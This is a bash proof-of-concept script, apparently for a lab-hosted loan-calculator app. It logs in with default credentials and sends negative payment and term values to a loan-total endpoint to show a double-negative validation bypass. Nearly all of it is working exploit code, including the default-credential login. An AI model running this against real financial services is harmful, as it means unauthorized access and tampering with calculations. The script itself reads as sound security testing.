#!/bin/bash

# POC: Calculation Logic Bypass - Double Negative Values Cancel Out
# Description: Tests if negative payment and negative term multiply to produce positive total
# This POC requires authentication first with default credentials

TARGET_URL="${1:-http://localhost:32768}"
PRINCIPAL="1000"
PAYMENT="-100"
TERM="-10"

echo "=========================================="
echo "Testing Double Negative Bypass Vulnerability"
echo "=========================================="
echo ""

# First, authenticate with default credentials
echo "[*] Authenticating with default credentials..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -d "username=test&password=test" "${TARGET_URL}/login")

# Check if login was successful
if echo "$LOGIN_RESPONSE" | grep -q "profile"; then
    echo "[+] Authentication successful"
else
    echo "[!] Continuing with requests..."
fi

echo ""

# Test 1: Single negative payment (expected: negative result)
echo "[Test 1] Single negative payment:"
echo "Request: GET ${TARGET_URL}/total_loan_payments?principal=${PRINCIPAL}&payment=${PAYMENT}&term=10"
RESPONSE1=$(curl -s -b /tmp/cookies.txt "${TARGET_URL}/total_loan_payments?principal=${PRINCIPAL}&payment=${PAYMENT}&term=10")
echo "Response: ${RESPONSE1}"
# Extract total_loan_payments value specifically
VALUE1=$(echo "$RESPONSE1" | grep -oP '"total_loan_payments":\s*"\K[^"]*')
echo "Total Loan Payments: ${VALUE1}"
echo ""

# Test 2: Single negative term (expected: negative result)
echo "[Test 2] Single negative term:"
echo "Request: GET ${TARGET_URL}/total_loan_payments?principal=${PRINCIPAL}&payment=100&term=${TERM}"
RESPONSE2=$(curl -s -b /tmp/cookies.txt "${TARGET_URL}/total_loan_payments?principal=${PRINCIPAL}&payment=100&term=${TERM}")
echo "Response: ${RESPONSE2}"
VALUE2=$(echo "$RESPONSE2" | grep -oP '"total_loan_payments":\s*"\K[^"]*')
echo "Total Loan Payments: ${VALUE2}"
echo ""

# Test 3: Both negative (VULNERABLE - produces positive result)
echo "[Test 3] BOTH negative - Double negative bypass:"
echo "Request: GET ${TARGET_URL}/total_loan_payments?principal=${PRINCIPAL}&payment=${PAYMENT}&term=${TERM}"
RESPONSE3=$(curl -s -b /tmp/cookies.txt "${TARGET_URL}/total_loan_payments?principal=${PRINCIPAL}&payment=${PAYMENT}&term=${TERM}")
echo "Response: ${RESPONSE3}"
VALUE3=$(echo "$RESPONSE3" | grep -oP '"total_loan_payments":\s*"\K[^"]*')
echo "Total Loan Payments: ${VALUE3}"
echo ""

echo "=========================================="
echo "VULNERABILITY ANALYSIS:"
echo "=========================================="
echo "Test 1 - Single negative payment: ${VALUE1}"
echo "Test 2 - Single negative term: ${VALUE2}"
echo "Test 3 - Both negative: ${VALUE3}"
echo ""

# Check if double negative produced positive result
if [[ "$VALUE1" == "-"* ]] && [[ "$VALUE2" == "-"* ]] && [[ ! "$VALUE3" == "-"* ]]; then
    echo "[!] VULNERABLE - Double Negative Bypass Confirmed!"
    echo ""
    echo "Evidence:"
    echo "  - Single negative payment produces: ${VALUE1} (negative)"
    echo "  - Single negative term produces: ${VALUE2} (negative)"
    echo "  - Both negatives produce: ${VALUE3} (POSITIVE!)"
    echo ""
    echo "The two negative values multiplied together to bypass validation!"
    rm -f /tmp/cookies.txt
    exit 0
else
    echo "[*] Test results:"
    echo "  - VALUE1: ${VALUE1}"
    echo "  - VALUE2: ${VALUE2}"
    echo "  - VALUE3: ${VALUE3}"
    rm -f /tmp/cookies.txt
    exit 1
fi